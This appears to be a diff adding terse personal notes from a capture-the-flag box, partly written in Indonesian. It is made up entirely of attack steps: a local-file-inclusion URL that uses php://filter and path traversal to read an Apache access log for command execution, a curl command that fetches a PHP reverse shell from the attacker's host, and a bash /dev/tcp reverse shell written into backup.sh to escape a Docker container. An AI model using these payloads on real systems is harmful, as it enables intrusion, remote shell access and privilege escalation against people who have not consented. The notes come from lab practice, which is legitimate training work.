@@ -1,0 +1,6 @@
+10.10.47.94/?view=php://filter/convert.base64-encode/resource=cat/../../../../../var/log/apache2/access.log&cmd= ??? &ext=
+
+curl 10.8.15.76:8000/Wuvel/CTF/SHL/php-reverse-shell/php-reverse-shell.php > shell.php
+
+- 	Privesc ke machine asli, karena skrg kita lagi di docker
+	echo "bash -c 'exec bash -i &>/dev/tcp/10.8.15.76/1234 <&1'" > backup.sh
